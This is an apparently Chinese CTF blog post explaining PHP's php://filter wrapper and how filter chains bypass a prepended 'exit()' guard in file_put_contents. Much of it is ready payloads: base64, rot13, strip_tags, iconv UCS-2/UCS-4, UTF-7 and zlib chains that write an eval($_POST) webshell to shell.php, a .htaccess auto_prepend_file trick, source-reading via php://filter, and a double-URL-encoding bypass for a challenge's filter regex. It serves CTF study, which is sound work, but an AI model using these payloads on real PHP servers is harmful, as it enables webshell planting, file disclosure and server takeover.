@@ -1,0 +1,382 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><meta name="theme-color" content="#2d4356"><meta name="baidu-site-verification"><title>详解php://fliter | sakura</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="sakura" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/plugins/highlight/atom-one-dark.min.css"><script type="text/javascript" src="/plugins/highlight/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();
+</script><script type="text/javascript" src="/js/ready.js" async></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"><body class="night"><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">sakura</a></h1></div><p class="m-desc">那就祝我们有讲不完的笑话和数不尽的浪漫</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/categories/">分类</a></li><li><span class="dot">●</span><a href="/tags/">标签</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="搜索" onfocus="if(this.value=='搜索'){this.value='';}" onblur="if(this.value==''){this.value='搜索';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">详解php://fliter</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/">2022-12-01</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF/">CTF</a>&nbsp;&bull;&nbsp;<a href="/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/">常见漏洞和手法</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>[TOC]</p>
+<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>(看到这么一篇文章，感觉作者已经把这个考点总结的非常到位了，我就直接搬运过来了)</p>
+<p>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
+<pre><code>php:// — 访问各个输入/输出流（I/O streams）
+php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。
+</code></pre>
+<p><code>php://filter</code> 参数</p>
+<p><code>php://filter</code>可以作为一个中间流来处理其他流。<br><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201164511180.png" alt="image-20221201164511180"></p>
+<p>测试代码：</p>
+<pre><code class="php">&lt;?php
+    highlight_file(__FILE__);
+    header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+    $file1 = $_GET[&#39;file1&#39;];
+    $file2 = $_GET[&#39;file2&#39;];
+    $txt = $_GET[&#39;txt&#39;];
+    echo file_get_contents($file1);
+    file_put_contents($file2,$txt);
+?&gt;
+</code></pre>
+<p>读取文件：</p>
+<pre><code class="php"># 明文读取
+index.php?file1=php://filter/resource=flag.php
+</code></pre>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201165336313.png" alt="image-20221201165336313"></p>
+<pre><code class="php"># 编码读取
+index.php?file1=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201165407569.png" alt="image-20221201165407569"></p>
+<p>写入文件：</p>
+<pre><code class="php"># 明文写入
+index.php?file2=php://filter/resource=test.txt&amp;txt=helloworld
+</code></pre>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201170013270.png" alt="image-20221201170013270"></p>
+<pre><code class="php"># 编码写入
+index.php?file2=php://filter/write=convert.base64-encode/resource=test.txt&amp;txt=helloworld
+</code></pre>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201170104909.png" alt="image-20221201170104909"></p>
+<h1 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h1><h2 id="字符串过滤器"><a href="#字符串过滤器" class="headerlink" title="字符串过滤器"></a>字符串过滤器</h2><p><strong>string.rot13</strong></p>
+<pre><code class="php">string.rot13 （自 PHP 4.3.0 起）使用此过滤器等同于用 str_rot13()函数处理所有的流数据。
+
+str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。
+</code></pre>
+<p><strong>string.toupper</strong></p>
+<pre><code class="php">string.toupper  (自 PHP 5.0.0 起) 使用此过滤器等同于用 strtoupper()函数处理所有的流数据。
+
+strtoupper—将字符串转化为大写
+</code></pre>
+<p><strong>string.tolower</strong></p>
+<pre><code class="php">string.tolower （自 PHP 5.0.0 起）使用此过滤器等同于用 strtolower()函数处理所有的流数据。
+
+strtolower—将字符串转化为小写
+</code></pre>
+<h2 id="string-strip-tags"><a href="#string-strip-tags" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h2><p>使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。 </p>
+<p>strip_tags—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串str去除空字符、HTML 和 PHP 标记后的结果。它使用与函数fgetss()一样的机制去除标记。</p>
+<h2 id="转换过滤器"><a href="#转换过滤器" class="headerlink" title="转换过滤器"></a>转换过滤器</h2><p>如同 string.* 过滤器，convert.* 过滤器的作用就和其名字一样。转换过滤器是 PHP 5.0.0 添加的。对于指定过滤器的更多信息，请参考该函数的手册页:<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a></p>
+<p><strong>convert.base64</strong></p>
+<pre><code class="php">convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用base64_encode()和base64_decode()函数处理所有的流数据。
+convert.base64-encode支持以一个关联数组给出的参数。如果给出了line-length，base64 输出将被用line-length个字符为长度而截成块。如果给出了line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用base64_encode()再加上 chunk_split()相同。
+</code></pre>
+<p><strong>convert.quoted</strong></p>
+<pre><code class="php">convert.quoted-printable-encode和convert.quoted-printable-decode使用此过滤器的decode版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和convert.quoted-printable-encode相对应的函数。
+convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和convert.base64-encode一样的附加参数外，convert.quoted-printable-encode还支持布尔参数binary和 force-encode-first。
+convert.base64-decode只支持line-break-chars参数作为从编码载荷中剥离的类型提示。
+</code></pre>
+<p><strong>convert.iconv.</strong>*</p>
+<p>这个过滤器需要<code>php</code>支持 <code>iconv</code> ，而<code>iconv</code>是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于用<code>iconv()</code>函数处理所有的流数据。</p>
+<p><code>iconv</code> — 字符串按要求的字符编码来转换</p>
+<p>convery.iconv.*的使用有两种方法:</p>
+<pre><code class="php">convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 
+or 
+convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;
+</code></pre>
+<p>支持的字符编码有一下几种（详细参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/en/mbstring.supported-encodings.php">官方手册</a>）</p>
+<pre><code class="php">UCS-4*
+UCS-4BE
+UCS-4LE*
+UCS-2
+UCS-2BE
+UCS-2LE
+UTF-32*
+UTF-32BE*
+UTF-32LE*
+UTF-16*
+UTF-16BE*
+UTF-16LE*
+UTF-7
+UTF7-IMAP
+UTF-8*
+ASCII*
+</code></pre>
+<p><strong>压缩过滤器</strong></p>
+<p>虽然 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">压缩封装协议</a> 提供了在本地文件系统中 创建 gzip 和 bz2 兼容文件的方法，但不代表可以在网络的流中提供通用压缩的意思，也不代表可以将一个非压缩的流转换成一个压缩流。对此，压缩过滤器可以在任何时候应用于任何流资源。</p>
+<pre><code class="php">Note: 压缩过滤器 不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 
+
+zlib.* 压缩过滤器自 PHP 版本 5.1.0起可用，在激活 zlib的前提下。也可以通过安装来自 » PECL的 » zlib_filter包作为一个后门在 5.0.x版中使用。此过滤器在 PHP 4 中 不可用。
+</code></pre>
+<pre><code class="php">?file=compress.zlib://flag.php
+</code></pre>
+<p><strong>加密过滤器</strong></p>
+<pre><code class="php">mcrypt.*和 mdecrypt.*使用libmcrypt提供了对称的加密和解密。这两组过滤器都支持mcrypt扩展库中相同的算法，格式为 mcrypt.ciphername，其中ciphername是密码的名字，将被传递给mcrypt_module_open()。有以下五个过滤器参数可用：
+</code></pre>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201171811276.png" alt="image-20221201171811276"></p>
+<h1 id="绕过死亡exit-易"><a href="#绕过死亡exit-易" class="headerlink" title="绕过死亡exit(易)"></a>绕过死亡exit(易)</h1><p>源码:</p>
+<pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+$filename=$_GET[&#39;filename&#39;];
+$content=$_GET[&#39;content&#39;];
+file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);
+</code></pre>
+<p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。</p>
+<p>这里的$_POST[‘filename’]是可以控制协议的.</p>
+<h2 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h2><p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途。</p>
+<p>base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</p>
+<p>当$content被加上了<?php exit; ?>以后，我们可以使用php://filter/write=convert.base64-decode来首先对其解码。在解码的过程中，字符&lt; ? ; &gt;空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</p>
+<p>由于，”phpexit”一共7个字符，但是base64算法解码时是4个byte一组，所以我们可以随便再给他添加一个字符。这样前边的phpexit加上另一个字符就会被base64解码，然后后边的我们精心构造的base64字符串也会被成功解码为php代码。</p>
+<p>payload:</p>
+<pre><code class="php">?filename=php://filter/convert.base64-decode/resource=1.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
+# PD9waHAgZXZhbCgkX1BPU1RbYV0pOw== --&gt;   &lt;?php eval($_POST[a]);
+</code></pre>
+<p>成功写入</p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201173344222.png" alt="image-20221201173344222"></p>
+<p>尝试连接:</p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201173446876.png" alt="image-20221201173446876"></p>
+<h2 id="rot13绕过"><a href="#rot13绕过" class="headerlink" title="rot13绕过"></a>rot13绕过</h2><p>str_rot13—对字符串执行ROT13转换. ROT13编码简单地使用字母表中后面第13个字母替换当前字母，同时忽略非字母表中的字符。编码和解码都使用相同的函数，传递一个编码过的字符串作为参数，将得到原始字符串。</p>
+<p>利用php://filter中string.rot13过滤器去除”exit”。string.rot13的特性是编码和解码都是自身完成，利用这一特性可以去除exit。 <?php exit;?> 在经过rot13编码后会变成 <?cuc rkvg();?> ，不过这种利用手法的前提是PHP不开启short_open_tag</p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201173642560.png" alt="image-20221201173642560"></p>
+<p>虽然官方说的默认开启，但是在<code>php.ini</code>中默认是注释掉的，也就是说它还是默认关闭。</p>
+<p>payload:</p>
+<pre><code class="php">?filename=php://filter/write=string.rot13/resource=2.php&amp;content=&lt;?cuc riny($_CBFG[n]);
+</code></pre>
+<p>成功写入:</p>
+<pre><code class="php">root@nxacloud-hycomegg:/var/www/html# cat 2.php
+&lt;?cuc rkvg();&lt;?php eval($_POST[a]);
+</code></pre>
+<h2 id="string-strip-tags-1"><a href="#string-strip-tags-1" class="headerlink" title="string.strip_tags"></a>string.strip_tags</h2><p><code>strip_tags</code>— 从字符串中去除 HTML 和 PHP 标记。该函数尝试返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。它使用与函数<code>fgetss()</code>一样的机制去除标记。</p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221201174051617.png" alt="image-20221201174051617"></p>
+<p>但是我们的目的是写入<code>webshell</code>，如果那样的话，我们的<code>webshell</code>岂不是同样起不了作用，不过我们可以使用多个过滤器进行绕过这个限制（<code>php://filter</code>允许通过使用多个过滤器）。</p>
+<pre><code class="php">1、webshell用base64编码   //为了避免strip_tags的影响
+
+2、调用string.strip_tags //这一步将去除&lt;?php exit; ?&gt;
+
+3、调用convert.base64-decode //这一步将还原base64编码的webshell
+</code></pre>
+<p>payload:</p>
+<pre><code class="php">?filename=php://filter/write=string.strip_tags|convert.base64-decode/resource=3.php&amp;content=?&gt;PD9waHAgZXZhbCgkX1BPU1RbYV0pOw==
+</code></pre>
+<p>成功写入:</p>
+<pre><code class="php">root@nxacloud-hycomegg:/var/www/html# cat 3.php 
+&lt;?php eval($_POST[a]);
+</code></pre>
+<h2 id="htaccess的预包含处理"><a href="#htaccess的预包含处理" class="headerlink" title=".htaccess的预包含处理"></a>.htaccess的预包含处理</h2><p>PHP中<code>auto_prepend_file</code>与<code>auto_append_file</code>用法实例分析：</p>
+<p><code>php.ini</code>中有两项：</p>
+<pre><code class="php">auto_prepend_file 在页面顶部加载文件
+auto_append_file 在页面底部加载文件
+</code></pre>
+<p>使用这种方法可以不需要改动任何页面，当需要修改顶部或底部<code>require</code>文件时，只需要修改<code>auto_prepend_file</code>与<code>auto_append_file</code>的值即可。</p>
+<p>例如：修改<code>php.ini</code>，修改<code>auto_prepend_file</code>与<code>auto_append_file</code>的值。</p>
+<pre><code class="php">auto_prepend_file = &quot;/home/fdipzone/header.php&quot;
+auto_append_file = &quot;/home/fdipzone/footer.php&quot;
+</code></pre>
+<p>修改后重启服务器，这样所有页面的顶部与底部都会require /home/fdipzone/header.php与 /home/fdipzone/footer.php</p>
+<p>如果不需要所有页面都在顶部或底部require文件，可以指定某一个文件夹内的页面文件才调用auto_prepend_file与auto_append_file<br>在需要顶部或底部加载文件的文件夹中加入.htaccess文件，内容如下：</p>
+<pre><code class="php">php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;
+php_value auto_append_file &quot;/home/fdipzone/footer.php&quot;
+</code></pre>
+<p>这样在指定<code>.htaccess</code>的文件夹内的页面文件才会加载<code>/home/fdipzone/header.php</code>与<code>/home/fdipzone/footer.php</code>，其他页面文件不受影响。</p>
+<p>自定义包含我们的flag文件。</p>
+<p>payload：</p>
+<pre><code class="php">?filename=php://filter/write=string.strip_tags/resource=.htaccess&amp;content=?&gt;php_value auto_prepend_file &quot;/flag&quot;
+</code></pre>
+<p>首先来解释<code>$filename</code>的代码，这里引用了<code>string.strip_tags</code>过滤器，可以过滤<code>.htaccess</code>内容的<code>html</code>标签，自然也就消除了死亡代码；<code>$content</code>即闭合死亡代码使其完全消除，并且写入自定义包含文件；</p>
+<p>这里我没有复现成功,原因是文件没有成功写入,先放下</p>
+<h1 id="绕过死亡exit-难"><a href="#绕过死亡exit-难" class="headerlink" title="绕过死亡exit(难)"></a>绕过死亡exit(难)</h1><pre><code class="php">&lt;?php
+highlight_file(__FILE__);
+header(&quot;Content-Type: text/html; charset=utf-8&quot;);
+$content = $_GET[content];
+file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);
+</code></pre>
+<p>这种情况下写入的文件，其文件名和文件部分内容一致，这就导致利用的难度大大增加了，不过最终目的还是相同的：都是为了去除文件头部内容<code>exit</code>这个关键代码写入<code>shell</code>后门。</p>
+<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>构造：</p>
+<pre><code class="php">content=php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=shell.php
+
+或
+
+content=php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php
+</code></pre>
+<p>进行拼接之后就是 <code>&lt;?php exit();php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</code> 然后会对其进行一次整体的 base64-decode 。从而分解掉死亡代码，</p>
+<p>但是无法生成content；虽然文件创建成功，但是就是无法生成content。问题在于resource后边的 =；</p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207220126186.png" alt="image-20221207220126186"></p>
+<p><code>=</code>在<code>base64</code>中的作用是填充，也就是以为着结束；在<code>=</code>的后面是不允许有任何其他字符的否则会报错，</p>
+<p>这里因为是由于<code>‘=’</code>从而使得我们写入<code>content</code>不成功，那么我们可以想个方法去掉等号即可</p>
+<p>payload：</p>
+<pre><code class="php">content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php
+</code></pre>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207220546144.png" alt="image-20221207220546144"></p>
+<p>为什么这么写就能够成功写入呢?</p>
+<p>首先传入content内容后,写入文件的内容变为:</p>
+<pre><code class="php">&lt;?php exit();php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php
+</code></pre>
+<p>我们发现什么?</p>
+<p>php被闭合了,但是我们写入的base64在闭合标签外</p>
+<p>首先调用<code>string.strip_tags</code> 去除掉php标签,结果</p>
+<pre><code class="php">PD9waHAgcGhwaW5mbygpOz8+.php
+</code></pre>
+<p>然后base64解密，文件的内容变为:</p>
+<pre><code class="php">&lt;?php phpinfo();?&gt;乱码
+</code></pre>
+<p>可以生成文件，并且可以看到我们已经成功写入了<code>shell</code>；但是文件名确实有问题，当我们在浏览器访问的时候，会出现访问不到的问题，这里是因为引号的问题；那么如何避免，我们可以使用伪目录的方法，进行变相的绕过去；</p>
+<p><strong>最终payload1:</strong></p>
+<pre><code class="php">content=php://filter/string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b/../shell.php
+</code></pre>
+<p>注意：这里<code>%2b</code>是<code>+</code>号的url编码，不进行编码会被当成空格处理</p>
+<p>我们将前面的一串<code>base64</code>字符和闭合的符号整体看作一个目录，虽然没有，但是我们后面重新撤回了原目录，生成<code>shell.php</code>文件；从而就可以生成正常的文件名.</p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207221020006.png" alt="image-20221207221020006"></p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207221044695.png" alt="image-20221207221044695"></p>
+<p><strong>最终payload2:</strong></p>
+<p>或者去掉等号之直接对内容进行变性另类<code>base64</code></p>
+<p>其实这种也是借助于过滤器，但是原理并不是和之前的原理一样，之前的原理即是：闭合原本的死亡代码，然后在进行过滤器过滤掉内容中的<code>html</code>标签，从而对剩下的内容进行<code>base64</code>解码。但是这种方法却不是如此，payload如下：</p>
+<pre><code class="php">php://filter/&lt;?|string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2b/../shell.php
+</code></pre>
+<p>这种<code>payload</code>的攻击原理即是首先直接在内容时，就将我们<code>base64</code>遇到的<code>=</code>这个问题直接写在<code>&lt;? ?&gt;</code>中进行过滤掉，然后<code>base64-decode</code>再对原本内容的<code>&lt;?php exit();</code>进行转码，从而达到分解死亡代码的效果</p>
+<h2 id="rot13绕过-1"><a href="#rot13绕过-1" class="headerlink" title="rot13绕过"></a>rot13绕过</h2><p>尽管<code>base64</code>比较特别，但是并不是所有的编码都受限于‘=’，这里可以采用rot13编码即可；</p>
+<p>payload：</p>
+<pre><code class="php">content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php
+
+content=php://filter/write=string.rot13/resource=&lt;?cuc cucvasb();?&gt;/../shell.php
+</code></pre>
+<p>生成文件内容：</p>
+<pre><code class="php">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.ebg13|&lt;?php phpinfo();?&gt;|/erfbhepr=f1zcyr.cuc
+</code></pre>
+<p>其原理就是利用转码从而将原本的死亡代码进行转码从而使引擎无法识别从而避免死亡代码；</p>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207231257441.png" alt="image-20221207231257441"></p>
+<h2 id="convert-iconv-绕过"><a href="#convert-iconv-绕过" class="headerlink" title="convert.iconv.*绕过"></a>convert.iconv.*绕过</h2><p>对于<code>iconv</code>字符编码转换进行绕过的手法，其实类似于上面所述的<code>base64</code>编码手段，都是先对原有字符串进行某种编码然后再解码，这个过程导致最初的限制<code>exit;</code>去除，而我们的恶意代码正常解码存储。</p>
+<ul>
+<li><strong>usc-2</strong></li>
+</ul>
+<p>通过UCS-2方式，对目标字符串进行2位一反转（这里的2LE和2BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-2中2的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p>
+<pre><code class="php">echo iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;,&#39;&lt;?php @eval($_POST[ab]);?&gt;&#39;);
+</code></pre>
+<p>payload:</p>
+<pre><code class="php">php://filter/convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp pe@av(l_$OPTSa[]b;)&gt;?/resource=shell.php
+</code></pre>
+<p>成功向 <code>shell.php</code> 写入</p>
+<pre><code class="php">?&lt;hp pxeti)(p;ph/:f/liet/rocvnre.tcino.vCU-SL2.ECU-SB2|E&lt;?php @eval($_POST[ab]);?&gt;r/seuocr=ehsle.l
+</code></pre>
+<ul>
+<li><strong>usc-4</strong></li>
+</ul>
+<p>通过UCS-4方式，对目标字符串进行4位一反转（这里的4LE和4BE可以看作是小端和大端的列子），也就是说构造的恶意代码需要是UCS-4中4的倍数，不然不能进行正常反转（多余不满足的字符串会被截断），那我们就可以利用这种过滤器进行编码转换绕过了</p>
+<pre><code class="php">&lt;?php
+echo iconv(&quot;UCS-4LE&quot;,&quot;UCS-4BE&quot;,&#39;&lt;?php @eval($_POST[abcd]);?&gt;&#39;);
+</code></pre>
+<p>28字符 <code>&lt;?php @eval($_POST[abcd]);?&gt;</code> 转为 <code>hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)</code></p>
+<p>payload:</p>
+<pre><code class="php">content=php://filter/convert.iconv.UCS-4LE.UCS-4BE|hp?&lt;e@ p(lavOP_$a[TS]dcb&gt;?;)/resource=shell.php
+</code></pre>
+<p>成功写入：</p>
+<pre><code class="php">hp?&lt;xe p)(tiphp;f//:etlioc/rrevnci.t.vno-SCU.EL4-SCU|EB4&lt;?php @eval($_POST[abcd]);?&gt;ser/cruohs=e.lle
+</code></pre>
+<ul>
+<li><strong>utf8-utf7</strong></li>
+</ul>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/20210525230208293.png" alt="在这里插入图片描述"></p>
+<p>这里发现生成的是+AD0-,然而经过检测，此字符串可以被base64进行解码；那也就意味着我们可以使用这种方法避免等号对我们base64解码的影响；我们可以直接写入base64加密后的payload，然后将其进行utf之间的转换，因为纯字符转换之后还是其本身；所以其不受影响，进而我们的base64-encode之后的编码依然是存在的，然后进行base64-decode一下，写入shell.</p>
+<p>payload:</p>
+<pre><code class="php">content=php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php
+</code></pre>
+<p>ps：</p>
+<pre><code class="php">// 这里要符合base64 解码按4 字节进行
+
+utf8 -&gt; utf-7
+
+&lt;?php exit();php://filter/write=aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=shell.php
+
+变为：
+
++ADw?php exit()+ADs-php://filter/write+AD0-aaaaXDw/cGhwIEBldmFsKCRfUE9TVFthXSk7ID8+-+AHw-convert.iconv.utf-8.utf-7+AHw-convert.base64-decode/resource+AD0-shell.php
+
+base64恶意payload的之前正好36个字节，所以写入了shell
+</code></pre>
+<p><img src="/2022/12/01/%E8%AF%A6%E8%A7%A3php-fliter/image-20221207232652549.png" alt="image-20221207232652549"></p>
+<h1 id="ctf题目"><a href="#ctf题目" class="headerlink" title="ctf题目"></a>ctf题目</h1><h2 id="VMCTF-Checkin"><a href="#VMCTF-Checkin" class="headerlink" title="VMCTF Checkin"></a>VMCTF Checkin</h2><pre><code class="php">&lt;?php
+//PHP 7.0.33 Apache/2.4.25
+error_reporting(0);
+$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;HTTP_X_REAL_IP&#39;]);
+@mkdir($sandbox);
+@chdir($sandbox);
+highlight_file(__FILE__);
+if(isset($_GET[&#39;content&#39;])) &#123;
+    $content = $_GET[&#39;content&#39;];
+    if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))
+         die(&#39;hacker&#39;);
+    if(file_exists($content))
+        require_once($content);
+    echo $content;
+    file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);
+&#125;
+</code></pre>
+<p>这里主要就是考察过滤器构造绕过</p>
+<p>题目中过滤的过滤器有</p>
+<pre><code class="php">/iconv|UCS|UTF|rot|quoted|base64/
+</code></pre>
+<p>但是需要注意<code>file_put_contents</code>要调用伪协议，</p>
+<pre><code class="php">static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) 
+&#123;
+    char *p, *token = NULL;
+    php_stream_filter *temp_filter;
+
+    p = php_strtok_r(filterlist, &quot;|&quot;, &amp;token);
+    while (p) &#123;
+        php_url_decode(p, strlen(p));#对过滤器进行了一次urldecode
+        if (read_chain) &#123;
+            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;
+                php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);
+            &#125; else &#123;
+                php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);
+            &#125;
+        &#125;
+        if (write_chain) &#123;
+            if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;
+                php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);
+            &#125; else &#123;
+                php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);
+            &#125;
+        &#125;
+        p = php_strtok_r(NULL, &quot;|&quot;, &amp;token);
+    &#125;
+&#125;
+</code></pre>
+<p>而伪协议处理时会对过滤器 <code>urldecode</code> 一次，所以是可以利用二次编码绕过的，</p>
+<p>payload:</p>
+<pre><code class="php">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=w0s1np.php
+</code></pre>
+<p>注：payload放过滤器的位置或者放文件名位置都可（因为有些编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，然后跳过继续执行的）。</p>
+<p>还可以利用压缩过滤器以及加密过滤器：</p>
+<p>zlib 的 zlib.deflate 和 zlib.inflate ，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续 inflate 的内容，简单遍历一下可以发现中间插入 string.tolower 转后会把空格和 exit 处理了就可以绕过exit</p>
+<pre><code class="php">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php
+</code></pre>
